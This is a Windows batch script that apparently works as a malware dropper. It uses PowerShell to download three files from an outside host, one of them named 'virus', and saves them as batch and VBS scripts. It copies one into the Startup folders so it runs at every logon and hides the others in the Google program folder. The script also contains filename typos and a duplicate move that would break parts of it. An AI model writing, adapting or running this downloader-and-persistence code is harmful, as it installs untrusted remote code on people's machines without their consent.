@echo off
:: first download a files. 
Powershell -Command "Invoke-WebRequest 'https://www.exampal.com/runner.txt' -OutFile runner.bat"
powershell -command "& { iwr https://www.exampal.com/starter.txt -OutFile stsrter.vbs }"
powershell -command "& { iwr https://www.exampal.com/virus.txt -OutFile virus.bat }"

:: copy all files in destination.
move /y "runner.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.*"
move /y "runner.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\*.*"

move /y "starter.vbs" "C:\Program files (x86)\Google\*.*"
move /y "virus.bat" "C:\Program files (x86)\Google\*.*"

exit